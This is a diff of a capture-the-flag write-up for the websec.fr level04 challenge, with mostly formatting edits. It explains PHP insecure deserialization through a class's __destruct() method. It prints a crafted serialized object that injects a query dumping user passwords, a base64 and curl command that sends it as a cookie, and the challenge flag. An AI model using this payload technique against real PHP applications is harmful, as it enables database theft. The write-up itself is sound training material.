@@ -87,8 +87,8 @@ class SQL {
 ```
 
 The `source2.php` help to connect to to database (`database.db`) and contains all functions who execute, recept query,
-and the `source1.php` file contains a part who receive user input and send request using a function in `source2.php`.
-The function who take our attention is `__destruct()` function who is know to be a special magic function who is called when an object is  destroyed.
+and the `source1.php` file contains a part who receive user input and send request using a function in `source2.php`.  
+The function who take our attention is `__destruct()` function who is know to be a special magic function who is called when an object is  destroyed.  
 It also know to conduct to insecure deserialization.
 
 So firstly it's important to know in the code what is doing , how it work.
@@ -131,22 +131,24 @@ so we can if we want bypass this check like this :
 ![alt text](/images/stc/bypass.png)
 
 Now about a term used in image : 
-- "SQL" `Object` was choosen because `__destruct()` method
+- **SQL** `Object` was choosen because `__destruct()` method
 in **SQL class** use  the variable `$query` to build the **SQL**
 query. By change this value in serialized data the Attacker
 can force the app to run a arbitrary SQL query .
-- "`conn`" represent database **connexion** and `N` is her value
+- `conn` represent database **connexion** and `N` is her value
 because by setting it have a `NULL` value .
 
-I personnaly write a serialized data using the default serialized data given by app
+I personnaly write a **serialized data** using the default serialized data given by app :
 
 `a:2:{s:2:"ip";s:15:"137.255.127.129";s:7:"exploit";O:3:"SQL":1:{s:5:"query";s:39:"SELECT password AS username FROM users;";s:4:"conn";N;}}`
 
-but for bypass the check of ip address like show in previous image we can use this :
+but for bypass the check of **ip address** like show in previous image we can use this :
 
 `O:3:"SQL":1:{s:5:"query";s:39:"SELECT password AS username FROM users;";s:4:"conn";N;}`
 
-So let's go for exploitation 
+So let's go for exploitation:  
+
+
 ```bash
 tedsig42@exegol:~$ echo -n 'a:2:{s:2:"ip";s:15:"137.255.127.129";s:7:"exploit";O:3:"SQL":1:{s:5:"query";s:39:"SELECT password AS username FROM users;";s:4:"conn";N;}}' | base64
 
@@ -162,8 +164,10 @@ tedsig42@exegol:~$ curl -k https://websec.fr/level04/index.php -H "Cookie: leet_
 .................
 </html>
 ```
-and we got the flag.
+and we got the flag.  
+
 **Flag** : `WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}`
 
-The final image exploitation was here 
-![alt text](/images/stc/Serialized_data22.png)
+The final image exploitation was here :
+
+![alt text](/images/stc/Serialized_data221last.png)
